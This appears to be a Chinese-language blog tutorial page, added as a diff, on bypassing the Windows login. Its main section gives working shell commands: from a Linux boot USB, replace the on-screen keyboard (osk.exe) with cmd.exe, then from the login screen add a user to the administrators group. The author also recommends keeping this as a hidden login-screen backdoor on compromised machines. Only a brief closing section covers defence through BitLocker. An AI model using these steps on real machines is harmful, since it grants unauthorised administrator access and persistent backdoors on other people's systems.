@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+
+<!--欢迎来到hk987，人类的进化就靠你了-->
+ <!--
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░ ░▒▓██████▓▒░░▒▓████████▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░░░░░░▒▓█▓▒░ 
+░▒▓████████▓▒░▒▓███████▓▒░░░▒▓███████▓▒░░▒▓██████▓▒░░░░░░▒▓█▓▒░  
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░░░░░░▒▓█▓▒░░░▒▓█▓▒░▒▓█▓▒░░░░░▒▓█▓▒░  
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░░░░░░▒▓█▓▒░░░▒▓█▓▒░▒▓█▓▒░░░░▒▓█▓▒░   
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░ ░▒▓██████▓▒░░░░▒▓█▓▒░
+-->
+<!--前进!不择手段的前进-->
+<!--Copyright©hk987.fun-->
+<!--PC端Google和Firefox支持良好,移动端支持良好-->
+
+<html lang="zh-cn">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0,minimum-scale=1.0, maximum-scale=1.0,user-scalable=no">
+	<meta name="description" content="hk987-你在世俗里的名字不重要了">
+	<meta name="author" content="hk987">
+	<meta name="keywords" content="hk987,hk987.fun,hk987,黑客987,黑客学习,Windows技术,Linux技术,Archlinux,Linux软件,漏洞挖掘,网络安全,渗透测试,自动化办公,python全自动办公,Windows系统激活,新手学电脑,IT技术,Rust,Rust编程,黑客技术,黑客,红客,honker,hack,hacker,网络安全,信息安全,网络安全学习,计算机小白,网安入门,网络安全入门,渗透测试,黑客技术,网络基础入门,操作系统,新手学电脑,小白学电脑,hack学习,hack入门,Windows基础,linux基础,Archlinux基础,Rust基础,Rust入门,Rust编程基础,黑客入门,Ubuntu入门,Manjaro,Endeavouros,红帽系统,centos基础学习,Rocky系统基础,Linux基础命令,Windows批处理,Windows安全,Linux安全,Kali基础,Kali渗透测试,KaliLinux,BlackArch,Github,加密解密,具体数学,线性代数,离散数学,红队攻防,蓝队攻防,黑客靶场练习,黑客靶场,黑客实战,hack实战,hack编程,黑客编程">
+	<title>[Win基础]-3-用Linux启动U盘破解Windows开机密码  - hk987.fun - www.hk987.fun</title>
+	<link rel="shortcut icon" type="image/x-icon" href="../logo/favicon.png">
+	<link rel="stylesheet" type="text/css" href="../css/basic.css">
+	<link rel="stylesheet" type="text/css" href="../css/home.css">
+	<link rel="stylesheet" type="text/css" href="../css/text.css">
+	<!--prism.js代码高亮模块-->
+	<link rel="stylesheet" href="../css/prism.css" data-noprefix />
+	<script src="../plugins/prism.js"></script>
+	<!--/prism.js代码高亮模块-->
+</head>
+<body>
+	<!--header -->
+	<header id="nav">
+			<div class="nav-container">
+				<!-- 根大纲-->
+				<a href="../index.html" title="Hk987首页">
+					<h1 class="nav-logo">HK987 - hk987.fun</h1>
+				</a>
+				<h2 class="nav-site-description desc-hidden">
+					 S=−k∑pilnpi
+				</h2>
+				<nav class="nav-links">
+					<!-- nav连接大纲-->
+					<h1 style="display:none;">网站导航</h1>
+					<ul>
+						<li>
+							<a href="../index.html" title="sitemap">
+								<span class="link-word"><img src="../logo/archives.png" alt="archives" class="link-img"><span class="word-hidden">wiki</span></span>
+							</a>
+						</li>
+					</ul>
+				</nav>
+			</div>
+	</header>
+	<!-- /header -->
+
+	<!-- content-->
+	<div id="content">
+		<div class="content-container">
+			<!-- 文章区 -->
+			<article class="text-container">
+				<header class="text-header">
+					<h1>[Win基础]-3-用Linux启动U盘破解Windows开机密码</h1>	
+				</header>
+				<section class="text-body">
+					<h2>引言</h2>
+					<p>这篇文章主要介绍如何使用Linux系统U盘破解Windows开机密码，以及如何防范。</p>
+					<!-- 目录 -->
+					<h2>文章目录</h2>
+					<ul class="contents">	
+						 <li><a href="#windows-base-1">0×1.Linux启动U盘破解Windows开机密码思路</a></li>
+						 <li><a href="#windows-base-2">0×2.windows如何防范U盘破解系统密码</a></li>
+					 </ul>
+					<!-- /目录 -->
+
+					<!-- 正文 -->
+					<h2 id="windows-base-1">0×1.Linux启动U盘破解Windows开机密码思路</h2>
+
+					<p>此方法适用于WindowsXP/7/8/10/11，在往后的版本中，只要windows登陆界面的“轻松访问”（Utilman）功能不被取消，就能使用这个破解方法。</p>
+
+					<p>在WindowsXP往后的操作系统中，启动界面加入了一项叫做"轻松访问"（Utilman）的功能，这项功能的主要目的，是帮助一些视力、听力不太好，或者不能用键盘输入的用户完成一些操作。
+
+					这个叫做"轻松访问"的功能能够在输入密码前被执行，这就给我们提供了一个思路，如果我们替换"轻松访问"中的某项功能，那么就能实现在输入密码前执行替换过后的某个程序，即可达到破解密码的目的。
+
+					下面为WIN11的启动界面（Win7同样有这个图标，只是弹出来的界面不一样，但是同样能看到"屏幕键盘"，XP需要按键盘上的"Win键+U"即可打开轻松访问。注意：精简版的系统可能将这个功能删除，这时候可以将cmd.exe复制成Utilman.exe，只要在开机界面调用“轻松访问”功能即可打开cmd，之所以替换屏幕键盘osk.exe，是因为这样更加隐蔽。）</p>
+					<img src="images/osk.png" alt="images/windows-login-Utilman.png">
+					<p>这些功能也经常被hack利用，用作登录界面的后门维持。</p>
+
+					<p>***具体步骤：</p>
+					<p>1.如果能够接触到目标机器，用linux启动u盘启动，挂载机器的C盘到u盘系统的/mnt目录下，然后</p>
+					<pre class='line-numbers' data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！' >
+					<code class="lang-bat">
+					//在U盘的linux系统终端中先挂载目标系统盘（如果你不知道哪个是系统盘，可以一个个挂载，直到找到其中包含Windows文件夹的那一个分区，假设这里是/dev/nvme0n1p1这个分区）
+					mount /dev/nvme0n1p1 /mnt
+
+					//进入系统system32目录
+					cd /mnt/windows/system32
+
+					//将cmd.exe复制替换成osk.exe(先备份osk.exe方便恢复)
+					cp osk.exe osk.hk987
+					//将原有的osk.exe删除
+					rm -rf osk.exe
+					//复制cmd伪装成osk
+					cp cmd.exe osk.exe
+
+					//重启系统，然后拔出u盘，将启动选项调整成从硬盘启动
+					reboot
+					</code>
+					</pre>
+					<p>2.进入windows系统登录界面后，参考上面那张图片，在登录界面开启屏幕键盘，就能够看到熟悉的cmd黑窗口了</p>
+					<pre class='line-numbers' data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！' >
+					<code class="lang-bat">
+					//在cmd窗口中，创建用户hk987，密码是123456
+					net user hk987 123456 /add
+
+					//将创建的用户放入超级管理员组
+					net localgroup administrators hk987 /add
+
+					//然后关掉这个cmd创建，尝试用hk987登录吧
+					</code>
+					</pre>
+					<p>如果是得到的windows系统的shell，想留一个屏幕键盘的后门，同样可以这样替换，但这个登录界面的后门是没有保护的，每个人都能使用它。</p>
+
+					<h2 id="windows-base-2">0×2.windows如何防范U盘破解系统密码</h2>
+					<p>windows10往后的操作系统内置了BitLocker功能，如果对系统盘开启这个功能，就能防止通过U盘读取系统盘，这样U盘系统就无法去读取系统盘文件夹系统，从而无法替换登录界面的功能了。</p>
+					<img src="images/bitlocker.png" alt="images/windows-bitlocker.png">
+					<p>但是开启Bitlocker一定别忘了恢复秘钥，否则无法解密数据，到文章发布这个时间点为止（2024.10.29），还很难破解这种分区加密。</p>
+
+					<!-- /正文 -->
+
+				<footer class="text-footer">
+					<p>
+						*转载请注明来自:<a title="hk987.fun" style="color: rgb(4,181,150);" href="https://www.hk987.fun" target="_blank">hk987.fun</a>
+					</p>
+					<p>*原文连接:<a title="[Win基础]-3-用Linux启动U盘破解Windows开机密码" style="color: rgb(4,181,150);" href="https://www.hk987.fun/hk/windows-base-3.html" target="_blank">https://www.hk987.fun/hk/windows-base-3.html</a></p>
+				</footer>
+			</article>
+			<!-- /文章区 -->	
+		</div>
+	</div>
+	<!-- /content -->
+	
+	<!-- footer -->
+	<footer id="footer">
+		<div class="footer-container">
+			hk987.fun &nbsp;<img src="../logo/copyright.png" alt="未经作者允许,禁止任何形式的复制与转载" title="未经作者允许,禁止任何形式的复制与转载">&nbsp;All Rights Reserved.
+		</div>
+	</footer>
+	<!-- /footer -->
+</body>
+</html>
